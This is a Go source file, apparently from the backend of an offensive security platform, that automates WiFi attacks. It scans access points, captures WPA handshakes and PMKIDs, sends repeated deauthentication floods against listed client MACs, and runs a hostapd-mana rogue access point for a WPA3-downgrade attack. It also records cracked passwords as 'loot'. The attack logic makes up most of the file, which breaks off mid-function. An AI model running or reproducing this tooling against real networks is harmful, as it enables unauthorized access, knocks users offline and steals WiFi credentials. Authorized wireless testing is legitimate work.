package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/go-chi/chi/v5"
)

// ── Data structures ───────────────────────────────────────────────────────────

type WifiAP struct {
	BSSID      string   `json:"bssid"`
	ESSID      string   `json:"essid"`
	Channel    int      `json:"channel"`
	Power      int      `json:"power"`      // dBm (negative)
	Privacy    string   `json:"privacy"`    // WPA2, WEP, OPN …
	Cipher     string   `json:"cipher"`
	Auth       string   `json:"auth"`
	Beacons    int      `json:"beacons"`
	Clients    int      `json:"clients"`    // associated station count
	ClientMACs []string `json:"client_macs"` // MACs of associated stations
}

type WifiScanJob struct {
	mu      sync.Mutex
	cmd     *exec.Cmd
	output  []string
	done    bool
	csvPath string
}

type WifiCaptureJob struct {
	mu         sync.Mutex
	cmds       []*exec.Cmd
	output     []string
	handshakes []string // "BSSID (ESSID): /path/to/file.cap"
	done       bool
}

var (
	wifiScanJobs    sync.Map // sessionID → *WifiScanJob
	wifiCaptureJobs sync.Map // sessionID → *WifiCaptureJob
)

// ── Helpers ───────────────────────────────────────────────────────────────────

// getWifiInterfaces lists all wireless interfaces via `iw dev`.
func getWifiInterfaces() []string {
	out, err := exec.Command("iw", "dev").Output()
	if err != nil {
		return nil
	}
	var ifaces []string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Interface ") {
			name := strings.TrimSpace(strings.TrimPrefix(line, "Interface "))
			ifaces = append(ifaces, name)
		}
	}
	return ifaces
}

// enableMonitorMode puts a single interface into monitor mode.
// Uses "airmon-ng start <iface>" only — no "check kill" so other interfaces
// (wlan0, NetworkManager, wpa_supplicant) are left completely untouched.
// Returns the monitor interface name, combined output, and any error.
func enableMonitorMode(userID int, iface string) (monIface, output string, err error) {
	startOut, startErr := sudoRun(userID, "airmon-ng", "start", iface)
	output = string(startOut)
	if startErr != nil {
		return "", output, fmt.Errorf("airmon-ng start: %w", startErr)
	}

	// Try to parse the renamed monitor interface from airmon-ng output.
	// e.g. "mac80211 monitor mode vif enabled on [phy1]wlan0mon"
	monIface = "" // will be determined below
	for _, line := range strings.Split(output, "\n") {
		if strings.Contains(line, "monitor mode vif enabled") {
			if idx := strings.LastIndex(line, "]"); idx >= 0 {
				candidate := strings.TrimSpace(strings.TrimSuffix(line[idx+1:], ")"))
				if candidate != "" {
					monIface = candidate
				}
			}
		}
	}

	// Scan `iw dev` output for all interfaces and their types.
	// Some adapters stay as wlan0 in monitor mode rather than becoming wlan0mon.
	checkOut, _ := exec.Command("iw", "dev").Output()

	type iwIface struct{ name, kind string }
	var iwIfaces []iwIface
	var curName string
	for _, l := range strings.Split(string(checkOut), "\n") {
		t := strings.TrimSpace(l)
		if strings.HasPrefix(t, "Interface ") {
			curName = strings.TrimPrefix(t, "Interface ")
		} else if strings.HasPrefix(t, "type ") && curName != "" {
			iwIfaces = append(iwIfaces, iwIface{curName, strings.TrimPrefix(t, "type ")})
		}
	}

	// 1. If airmon-ng told us a name, confirm it exists.
	if monIface != "" {
		for _, i := range iwIfaces {
			if i.name == monIface {
				return monIface, output, nil
			}
		}
	}

	// 2. Look for any interface now in monitor mode.
	for _, i := range iwIfaces {
		if i.kind == "monitor" {
			return i.name, output, nil
		}
	}

	// 3. Check whether the original interface itself switched to monitor mode.
	for _, i := range iwIfaces {
		if i.name == iface && i.kind == "monitor" {
			return iface, output, nil
		}
	}

	return "", output, fmt.Errorf("no monitor-mode interface found after airmon-ng start — adapter may not support monitor mode")
}

// disableMonitorMode restores the monitor interface to managed mode via airmon-ng stop.
func disableMonitorMode(userID int, monIface string) (string, error) {
	out, err := sudoRun(userID, "airmon-ng", "stop", monIface)
	return string(out), err
}

// enableManagedMode restores <iface> to managed mode and restarts NetworkManager.
func enableManagedMode(userID int, iface string) (string, error) {
	var combined string
	cmds := [][]string{
		{"ifconfig", iface, "down"},
		{"iwconfig", iface, "mode", "managed"},
		{"ifconfig", iface, "up"},
		{"systemctl", "restart", "NetworkManager.service"},
	}
	for _, c := range cmds {
		out, err := sudoRun(userID, c[0], c[1:]...)
		combined += string(out)
		if err != nil {
			return combined, fmt.Errorf("%s failed: %w", c[0], err)
		}
	}
	return combined, nil
}

func handleEnableManaged() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		claims, err := validateToken(extractToken(r))
		if err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		var req struct {
			Interface string `json:"interface"`
		}
		parseJSON(r, &req)
		if req.Interface == "" {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"interface required"}`)
			return
		}
		out, err := enableManagedMode(claims.UserID, req.Interface)
		outData, _ := encodeJSON(out)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, `{"error":%q,"output":%s}`, err.Error(), outData)
			return
		}
		fmt.Fprintf(w, `{"status":"managed","output":%s}`, outData)
	}
}

// parseAirodumpCSV parses an airodump-ng CSV file and returns discovered APs.
// The file format has two sections separated by a blank line:
//
//	BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Auth, Power, …, ESSID, Key
//	(blank line)
//	 Station MAC, …
func parseAirodumpCSV(path string) []WifiAP {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}

	lines := strings.Split(string(data), "\n")

	// ── Pass 1: parse APs ──────────────────────────────────────────────────
	apMap := map[string]int{} // bssid → index in aps slice
	var aps []WifiAP
	inAPs := false
	stationStart := -1

	for i, rawLine := range lines {
		line := strings.TrimSpace(rawLine)
		if strings.HasPrefix(line, "BSSID") && !inAPs {
			inAPs = true
			continue
		}
		if strings.HasPrefix(line, "Station MAC") || strings.HasPrefix(line, " Station MAC") {
			stationStart = i + 1
			break
		}
		if line == "" {
			if inAPs {
				continue // blank line between AP and station sections — keep going
			}
			continue
		}
		if !inAPs {
			continue
		}
		parts := strings.Split(line, ",")
		if len(parts) < 14 {
			continue
		}
		bssid := strings.TrimSpace(parts[0])
		if bssid == "" || strings.EqualFold(bssid, "bssid") {
			continue
		}
		ch, _ := strconv.Atoi(strings.TrimSpace(parts[3]))
		pwr, _ := strconv.Atoi(strings.TrimSpace(parts[8]))
		beacons, _ := strconv.Atoi(strings.TrimSpace(parts[9]))
		apMap[bssid] = len(aps)
		aps = append(aps, WifiAP{
			BSSID:   bssid,
			ESSID:   strings.TrimSpace(parts[13]),
			Channel: ch,
			Power:   pwr,
			Privacy: strings.TrimSpace(parts[5]),
			Cipher:  strings.TrimSpace(parts[6]),
			Auth:    strings.TrimSpace(parts[7]),
			Beacons: beacons,
		})
	}

	// ── Pass 2: collect associated client MACs per BSSID ─────────────────
	// Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
	if stationStart >= 0 {
		for _, rawLine := range lines[stationStart:] {
			line := strings.TrimSpace(rawLine)
			if line == "" {
				continue
			}
			parts := strings.Split(line, ",")
			if len(parts) < 6 {
				continue
			}
			stationMAC := strings.TrimSpace(parts[0])
			assocBSSID := strings.TrimSpace(parts[5])
			if stationMAC == "" || assocBSSID == "" || assocBSSID == "(not associated)" {
				continue
			}
			if idx, ok := apMap[assocBSSID]; ok {
				aps[idx].Clients++
				aps[idx].ClientMACs = append(aps[idx].ClientMACs, stationMAC)
			}
		}
	}

	return aps
}


// createHandshakeProject creates a project named after the SSID, a session within it
// for the captured AP, and a loot entry pointing at the capture files.
func createHandshakeProject(db *DB, userID int, ssid, bssid string, channel int, capFile, hashFile string, hashCount int) {
	name := ssid
	if name == "" {
		name = bssid
	}
	proj, err := db.CreateProject(userID, name, "")
	if err != nil {
		return
	}
	sess, err := db.CreateProjectSession(userID, proj.ID, "WiFi Handshake Capture", bssid)
	if err != nil {
		return
	}
	AppendWifiHandshakeLoot(sess.ID, bssid, ssid, bssid, capFile, hashFile, hashCount)
}

// upsertWifiCrackedProject finds or creates a project for the cracked SSID,
// finds or creates a "WiFi Cracked Credentials" session within it, then appends
// the cracked password (deduplicated by AppendBruteforceCredential).
// If attackSessionID belongs to an existing project that project is used directly.
func upsertWifiCrackedProject(db *DB, userID, attackSessionID int, essid, bssid, password string) {
	name := essid
	if name == "" {
		name = bssid
	}

	// Prefer the project the attacking session already belongs to
	var proj *Project
	if attackSessionID > 0 {
		if sess, err := db.GetSession(attackSessionID, userID); err == nil && sess.ProjectID != nil {
			proj, _ = db.GetProject(*sess.ProjectID, userID)
		}
	}

	// Fall back: find or create a project named after the SSID
	if proj == nil {
		projects, err := db.GetUserProjects(userID)
		if err == nil {
			for _, p := range projects {
				if strings.EqualFold(p.Name, name) {
					proj = p
					break
				}
			}
		}
		if proj == nil {
			var err error
			proj, err = db.CreateProject(userID, name, "")
			if err != nil {
				return
			}
		}
	}

	// Find or create "WiFi Cracked Credentials" session
	const sessName = "WiFi Cracked Credentials"
	var sessID int
	sessions, err := db.GetProjectSessions(proj.ID, userID)
	if err == nil {
		for _, s := range sessions {
			if s.SessionName == sessName {
				sessID = s.ID
				break
			}
		}
	}
	if sessID == 0 {
		sess, err := db.CreateProjectSession(userID, proj.ID, sessName, bssid)
		if err != nil {
			return
		}
		sessID = sess.ID
	}

	// Append credential — AppendBruteforceCredential deduplicates internally
	AppendBruteforceCredential(sessID, bssid, essid, password, "WPA")

	// Stamp the cracked password onto every wifi_handshake loot entry in this
	// project so it appears alongside the capture file in the Loot tab.
	allSessions, _ := db.GetProjectSessions(proj.ID, userID)
	for _, s := range allSessions {
		SetWifiHandshakePassword(s.ID, bssid, essid, bssid, password)
	}
}

// getFreshClientMACs re-parses the most recent scan CSV to get an up-to-date
// client list for the given BSSID. Returns nil if nothing found.
func getFreshClientMACs(sessionID int, bssid string) []string {
	prefix := fmt.Sprintf("/tmp/wifi-scan-%d", sessionID)
	for i := 1; i <= 5; i++ {
		path := fmt.Sprintf("%s-%02d.csv", prefix, i)
		for _, ap := range parseAirodumpCSV(path) {
			if strings.EqualFold(ap.BSSID, bssid) && len(ap.ClientMACs) > 0 {
				return ap.ClientMACs
			}
		}
	}
	return nil
}

// ── HTTP handlers ─────────────────────────────────────────────────────────────

func handleGetWifiInterfaces() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		ifaces := getWifiInterfaces()
		if ifaces == nil {
			ifaces = []string{}
		}
		data, _ := encodeJSON(ifaces)
		fmt.Fprintf(w, `{"interfaces":%s}`, data)
	}
}

func handleEnableMonitor() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		claims, err := validateToken(extractToken(r))
		if err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		var req struct {
			Interface string `json:"interface"`
		}
		parseJSON(r, &req)
		if req.Interface == "" {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"interface required"}`)
			return
		}
		monIface, out, err := enableMonitorMode(claims.UserID, req.Interface)
		outData, _ := encodeJSON(out)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, `{"error":%q,"output":%s}`, err.Error(), outData)
			return
		}
		fmt.Fprintf(w, `{"monitor_iface":%q,"output":%s}`, monIface, outData)
	}
}

func handleDisableMonitor() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		claims, err := validateToken(extractToken(r))
		if err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		var req struct {
			MonitorIface string `json:"monitor_iface"`
		}
		parseJSON(r, &req)
		out, err := disableMonitorMode(claims.UserID, req.MonitorIface)
		outData, _ := encodeJSON(out)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, `{"error":%q,"output":%s}`, err.Error(), outData)
			return
		}
		fmt.Fprintf(w, `{"status":"stopped","output":%s}`, outData)
	}
}

func handleStartWifiScan(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		claims, err := validateToken(extractToken(r))
		if err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		// Reject if already running
		if v, ok := wifiScanJobs.Load(sessionID); ok {
			job := v.(*WifiScanJob)
			job.mu.Lock()
			running := !job.done
			job.mu.Unlock()
			if running {
				w.WriteHeader(http.StatusConflict)
				fmt.Fprint(w, `{"error":"scan already running"}`)
				return
			}
		}
		var req struct {
			MonitorIface string `json:"monitor_iface"`
			Band         string `json:"band"` // "" | "a" | "bg" | "abg"
		}
		parseJSON(r, &req)
		if req.MonitorIface == "" {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"monitor_iface required"}`)
			return
		}

		csvPrefix := fmt.Sprintf("/tmp/wifi-scan-%d", sessionID)
		// Remove ALL numbered variants so airodump-ng always starts at -01
		for i := 1; i <= 20; i++ {
			os.Remove(fmt.Sprintf("%s-%02d.csv", csvPrefix, i))
			os.Remove(fmt.Sprintf("%s-%02d.cap", csvPrefix, i))
		}

		args := []string{
			req.MonitorIface,
			"--output-format", "csv",
			"--write-interval", "2",
			"-w", csvPrefix,
		}
		if req.Band != "" {
			args = append(args, "--band", req.Band)
		}

		cmd, err := sudoCmd(claims.UserID, "airodump-ng", args...)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, `{"error":%q}`, err.Error())
			return
		}
		// Use explicit pipes so airodump-ng sees a writable fd (not /dev/null which
		// can crash ncurses init). Drain both pipes without storing so memory stays flat.
		stdout, _ := cmd.StdoutPipe()
		stderr, _ := cmd.StderrPipe()

		if err := cmd.Start(); err != nil {
			fmt.Fprintf(w, `{"error":%q}`, err.Error())
			return
		}

		go io.Copy(io.Discard, stdout)
		go io.Copy(io.Discard, stderr)

		job := &WifiScanJob{cmd: cmd, csvPath: csvPrefix + "-01.csv"}
		wifiScanJobs.Store(sessionID, job)

		go func() {
			cmd.Wait()
			job.mu.Lock()
			job.done = true
			job.mu.Unlock()
		}()

		fmt.Fprint(w, `{"status":"started"}`)
	}
}

func handleGetWifiScan(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		v, ok := wifiScanJobs.Load(sessionID)
		if !ok {
			fmt.Fprint(w, `{"status":"idle","aps":[],"output":[]}`)
			return
		}
		job := v.(*WifiScanJob)
		job.mu.Lock()
		out := make([]string, len(job.output))
		copy(out, job.output)
		done := job.done
		csvPath := job.csvPath
		job.mu.Unlock()

		// Try the stored path first, then fall back to scanning for any variant
		aps := parseAirodumpCSV(csvPath)
		if len(aps) == 0 {
			prefix := strings.TrimSuffix(strings.TrimSuffix(csvPath, ".csv"), "-01")
			for i := 1; i <= 20; i++ {
				candidate := fmt.Sprintf("%s-%02d.csv", prefix, i)
				if candidate == csvPath {
					continue
				}
				if a := parseAirodumpCSV(candidate); len(a) > 0 {
					aps = a
					break
				}
			}
		}

		// Build diagnostic output lines so the user can see what airodump-ng is doing
		var diagLines []string
		if info, err := os.Stat(csvPath); err != nil {
			diagLines = append(diagLines, fmt.Sprintf("[diag] CSV not yet written: %s", csvPath))
		} else {
			diagLines = append(diagLines, fmt.Sprintf("[diag] CSV: %s (%d bytes)", csvPath, info.Size()))
		}
		allOut := append(diagLines, out...)

		if aps == nil {
			aps = []WifiAP{}
		}
		outData, _ := encodeJSON(allOut)
		apsData, _ := encodeJSON(aps)
		status := "running"
		if done {
			status = "done"
		}
		fmt.Fprintf(w, `{"status":%q,"aps":%s,"output":%s}`, status, apsData, outData)
	}
}

func handleStopWifiScan(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		v, ok := wifiScanJobs.Load(sessionID)
		if !ok {
			fmt.Fprint(w, `{"status":"idle"}`)
			return
		}
		job := v.(*WifiScanJob)
		job.mu.Lock()
		cmd := job.cmd
		job.mu.Unlock()
		if cmd != nil && cmd.Process != nil {
			cmd.Process.Kill()
		}
		fmt.Fprint(w, `{"status":"stopped"}`)
	}
}

type CaptureTarget struct {
	BSSID      string   `json:"bssid"`
	ESSID      string   `json:"essid"`
	Channel    int      `json:"channel"`
	ClientMACs []string `json:"client_macs"` // known connected stations
}

// prepareRogueIface tears the interface down, sets it to AP mode, and brings it back up
// so hostapd-mana can claim it without nl80211 driver errors.
func prepareRogueIface(userID int, iface string) error {
	// Unmanage from NetworkManager so it stops competing for the interface.
	sudoRun(userID, "nmcli", "device", "set", iface, "managed", "no")
	sudoRun(userID, "ip", "link", "set", iface, "down")
	// Set to managed mode — hostapd-mana's nl80211 driver performs its own
	// AP mode transition internally.  Forcing __ap here causes nl80211 errors.
	sudoRun(userID, "iw", "dev", iface, "set", "type", "managed")
	_, err := sudoRun(userID, "ip", "link", "set", iface, "up")
	return err
}

func generateHostapdManaConfig(iface, essid string, channel int, bssidTag string) (confPath, capPath string, err error) {
	hwMode := "g"
	if channel >= 34 {
		hwMode = "a"
	}
	capPath = fmt.Sprintf("/tmp/mana-%s.hccapx", bssidTag)
	confPath = fmt.Sprintf("/tmp/mana-%s.conf", bssidTag)
	// auth_algs=1  — open system auth only (WPA2 standard; shared-key is WEP-era)
	// wpa_pairwise=TKIP CCMP — advertise both cipher suites so more client
	//   supplicants accept the association (matches DragonShift's config)
	// enable_mana=1 — MANA promiscuous mode: hostapd responds to any client
	//   that probes for this SSID and captures the EAPOL 4-way handshake
	conf := fmt.Sprintf("interface=%s\ndriver=nl80211\nhw_mode=%s\nchannel=%d\nssid=%s\nauth_algs=1\nwpa=2\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP CCMP\nrsn_pairwise=CCMP\nwpa_passphrase=12345678\nenable_mana=1\nmana_wpaout=%s\n",
		iface, hwMode, channel, essid, capPath)
	err = os.WriteFile(confPath, []byte(conf), 0600)
	return
}

func handleStartWifiCapture(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		claims, err := validateToken(extractToken(r))
		if err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		userID := claims.UserID
		var req struct {
			MonitorIface  string          `json:"monitor_iface"`
			Targets       []CaptureTarget `json:"targets"`
			DeauthCount   int             `json:"deauth_count"`
			DeauthRepeat  bool            `json:"deauth_repeat"`
			WPA3Downgrade bool            `json:"wpa3_downgrade"`
			RogueIface    string          `json:"rogue_iface"`
		}
		parseJSON(r, &req)
		if req.MonitorIface == "" || len(req.Targets) == 0 {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"monitor_iface and targets required"}`)
			return
		}
		if req.DeauthCount <= 0 {
			req.DeauthCount = 10
		}

		job := &WifiCaptureJob{}
		wifiCaptureJobs.Store(sessionID, job)

		go func() {
			for _, t := range req.Targets {
				t := t
				capPrefix := fmt.Sprintf("/tmp/wifi-cap-%d-%s",
					sessionID, strings.ReplaceAll(t.BSSID, ":", ""))

				// Clean up all numbered variants so airodump-ng always starts at -01.
				for i := 1; i <= 20; i++ {
					os.Remove(fmt.Sprintf("%s-%02d.cap", capPrefix, i))
				}

				bssidTag := strings.ReplaceAll(t.BSSID, ":", "")

				// WPA3-Transition Downgrade: spawn hostapd-mana rogue AP before capture.
				if req.WPA3Downgrade && req.RogueIface != "" {
					manaPath, lookErr := exec.LookPath("hostapd-mana")
					if lookErr != nil {
						job.mu.Lock()
						job.output = append(job.output,
							"[!] WPA3-Downgrade aborted: hostapd-mana not found — install with: sudo apt install hostapd-mana",
						)
						job.mu.Unlock()
						continue
					}
					confPath, capPath, cfgErr := generateHostapdManaConfig(req.RogueIface, t.ESSID, t.Channel, bssidTag)
					if cfgErr != nil {
						job.mu.Lock()
						job.output = append(job.output, fmt.Sprintf("[!] WPA3-Downgrade aborted: failed to write hostapd-mana config: %v", cfgErr))
						job.mu.Unlock()
						continue
					}
					job.mu.Lock()
					job.output = append(job.output, fmt.Sprintf("[*] WPA3-Downgrade: preparing %s for AP mode", req.RogueIface))
					job.mu.Unlock()
					if prepErr := prepareRogueIface(userID, req.RogueIface); prepErr != nil {
						job.mu.Lock()
						job.output = append(job.output, fmt.Sprintf("[!] WPA3-Downgrade aborted: could not prepare %s: %v", req.RogueIface, prepErr))
						job.mu.Unlock()
						continue
					}
					manaCmd, manaCmdErr := sudoCmd(userID, manaPath, confPath)
					if manaCmdErr != nil {
						job.mu.Lock()
						job.output = append(job.output, fmt.Sprintf("[!] WPA3-Downgrade aborted: sudo not available: %v", manaCmdErr))
						job.mu.Unlock()
						continue
					}
					manaStdout, _ := manaCmd.StdoutPipe()
					manaStderr, _ := manaCmd.StderrPipe()
					if err := manaCmd.Start(); err != nil {
						job.mu.Lock()
						job.output = append(job.output, fmt.Sprintf("[!] WPA3-Downgrade aborted: failed to start hostapd-mana: %v", err))
						job.mu.Unlock()
						continue
					}
					job.mu.Lock()
					job.cmds = append(job.cmds, manaCmd)
					job.output = append(job.output,
						fmt.Sprintf("[*] WPA3-Downgrade: rogue AP '%s' on %s ch %d", t.ESSID, req.RogueIface, t.Channel),
					)
					job.mu.Unlock()
					// Stream hostapd-mana output
					streamMana := func(rc io.ReadCloser) {
						scanner := bufio.NewScanner(rc)
						for scanner.Scan() {
							line := "[mana] " + scanner.Text()
							job.mu.Lock()
							job.output = append(job.output, line)
							job.mu.Unlock()
						}
					}
					go streamMana(manaStdout)
					go streamMana(manaStderr)
					// Poll mana_wpaout for backup handshake confirmation
					go func(cp string) {
						for {
							time.Sleep(5 * time.Second)
							job.mu.Lock()
							done := job.done
							job.mu.Unlock()
							if done {
								return
							}
							if info, statErr := os.Stat(cp); statErr == nil && info.Size() > 0 {
								job.mu.Lock()
								job.output = append(job.output, fmt.Sprintf("[+] hostapd-mana captured handshake → %s", cp))
								job.mu.Unlock()
								return
							}
						}
					}(capPath)
					// Let rogue AP start broadcasting before we deauth clients
					time.Sleep(3 * time.Second)
				}

				// airodump-ng capture for this BSSID on its channel.
				// -c <ch> locks the interface to the correct channel for capture + deauth.
				capArgs := []string{
					req.MonitorIface,
					"--bssid", t.BSSID,
					"-c", strconv.Itoa(t.Channel),
					"--output-format", "cap",
					"-w", capPrefix,
				}
				capCmd, capCmdErr := sudoCmd(userID, "airodump-ng", capArgs...)
				if capCmdErr != nil {
					job.mu.Lock()
					job.output = append(job.output,
						fmt.Sprintf("[!] sudo not available for capture of %s: %v", t.BSSID, capCmdErr))
					job.mu.Unlock()
					continue
				}
				// Drain airodump-ng output without storing — keeps the pipe writable
				// so the process doesn't block or crash, but nothing lands in memory.
				capStdout, _ := capCmd.StdoutPipe()
				capStderr, _ := capCmd.StderrPipe()

				if err := capCmd.Start(); err != nil {
					job.mu.Lock()
					job.output = append(job.output,
						fmt.Sprintf("[!] Failed to start capture for %s: %v", t.BSSID, err))
					job.mu.Unlock()
					continue
				}
				go io.Copy(io.Discard, capStdout)
				go io.Copy(io.Discard, capStderr)

				job.mu.Lock()
				job.cmds = append(job.cmds, capCmd)
				job.output = append(job.output,
					fmt.Sprintf("[*] Capture started — %s  ch %d  (%s)", t.BSSID, t.Channel, t.ESSID),
					fmt.Sprintf("[*] Writing to %s-01.cap", capPrefix),
				)
				job.mu.Unlock()

				// findCapFile returns the first .cap variant airodump-ng actually wrote.
				findCapFile := func() string {
					for i := 1; i <= 20; i++ {
						p := fmt.Sprintf("%s-%02d.cap", capPrefix, i)
						if info, err := os.Stat(p); err == nil && info.Size() > 0 {
							return p
						}
					}
					return ""
				}

				// Poll for handshake every 5 s using hcxpcapngtool.
				// More reliable than aircrack-ng: produces a .22000 hash file whose
				// presence and size definitively confirm a WPA handshake or PMKID.
				go func() {
					for {
						time.Sleep(5 * time.Second)
						job.mu.Lock()
						done := job.done
						job.mu.Unlock()
						if done {
							return
						}
						capFile := findCapFile()
						if capFile == "" {
							job.mu.Lock()
							job.output = append(job.output, fmt.Sprintf("[diag] waiting for cap file — %s-01.cap not yet written", capPrefix))
							job.mu.Unlock()
							continue
						}
						hashFile := capFile + ".22000"
						os.Remove(hashFile) // fresh check each poll
						exec.Command("hcxpcapngtool", "-o", hashFile, capFile).Run()
						info, statErr := os.Stat(hashFile)
						if statErr != nil || info.Size() == 0 {
							os.Remove(hashFile)
							job.mu.Lock()
							job.output = append(job.output, fmt.Sprintf("[diag] hcxpcapngtool: no hashes yet in %s", capFile))
							job.mu.Unlock()
							continue
						}
						// Count WPA hash lines
						data, _ := os.ReadFile(hashFile)
						count := 0
						for _, line := range strings.Split(string(data), "\n") {
							if strings.TrimSpace(line) != "" {
								count++
							}
						}
						job.mu.Lock()
						job.output = append(job.output, fmt.Sprintf("[diag] hcxpcapngtool: %d hash(es) found in %s", count, capFile))
						entry := fmt.Sprintf("%s (%s): %s", t.BSSID, t.ESSID, capFile)
						alreadyFound := false
						for _, h := range job.handshakes {
							if h == entry {
								alreadyFound = true
								break
							}
						}
						if !alreadyFound {
							job.handshakes = append(job.handshakes, entry)
							job.output = append(job.output,
								fmt.Sprintf("[+] Handshake/PMKID captured! %s (%s) → %s (%d hash(es))",
									t.BSSID, t.ESSID, capFile, count))
						}
						job.mu.Unlock()
						// Auto-register in the Wifi Handshakes tab for immediate cracking
						registerCapturedHandshake(capFile, t.ESSID+"_"+strings.ReplaceAll(t.BSSID, ":", ""))
						// Create a project named after the SSID with a session + loot entry
						go createHandshakeProject(db, userID, t.ESSID, t.BSSID, t.Channel, capFile, hashFile, count)
						return // stop polling once found
					}
				}()

				// Short settle so airodump-ng has locked the channel before deauth fires.
				time.Sleep(2 * time.Second)

				sendDeauth := func() {
					// airodump-ng started with -c already locked the interface to the
					// correct channel. No need for a separate iwconfig call.
					if len(t.ClientMACs) == 0 {
						// No known clients — attempt PMKID capture via fake authentication.
						// This causes the AP to send EAPOL M1 which may contain a PMKID
						// crackable offline without a full 4-way handshake.
						sudoRun(userID, "aireplay-ng", "-1", "0", "-a", t.BSSID, "-e", t.ESSID, req.MonitorIface)
						job.mu.Lock()
						job.output = append(job.output,
							fmt.Sprintf("[*] PMKID attack → %s (%s) [fake auth, no clients in scan]", t.BSSID, t.ESSID))
						job.mu.Unlock()
						return
					}
					deauthBase := []string{"--deauth", strconv.Itoa(req.DeauthCount), "-a", t.BSSID}
					for _, clientMAC := range t.ClientMACs {
						args := append(append([]string{}, deauthBase...), "-c", clientMAC, req.MonitorIface)
						sudoRun(userID, "aireplay-ng", args...)
						job.mu.Lock()
						job.output = append(job.output,
							fmt.Sprintf("[*] Deauth × %d → %s client %s", req.DeauthCount, t.BSSID, clientMAC))
						job.mu.Unlock()
					}
				}

				sendDeauth()

				// If repeat mode, keep sending every 15 s until stopped or handshake captured.
				// Re-reads scan CSV each round to pick up clients that connected after the scan.
				if req.DeauthRepeat {
					go func() {
						for {
							time.Sleep(15 * time.Second)
							job.mu.Lock()
							done := job.done
							hsFound := false
							for _, h := range job.handshakes {
								if strings.HasPrefix(h, t.BSSID) {
									hsFound = true
									break
								}
							}
							job.mu.Unlock()
							if done || hsFound {
								return
							}
							// Refresh client list from scan CSV before each deauth round
							if fresh := getFreshClientMACs(sessionID, t.BSSID); len(fresh) > 0 {
								t.ClientMACs = fresh
							}
							sendDeauth()
						}
					}()
				}
			}
		}()

		fmt.Fprint(w, `{"status":"started"}`)
	}
}

func handleGetWifiCapture(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		v, ok := wifiCaptureJobs.Load(sessionID)
		if !ok {
			fmt.Fprint(w, `{"status":"idle","output":[],"handshakes":[]}`)
			return
		}
		job := v.(*WifiCaptureJob)
		job.mu.Lock()
		out := make([]string, len(job.output))
		copy(out, job.output)
		hs := make([]string, len(job.handshakes))
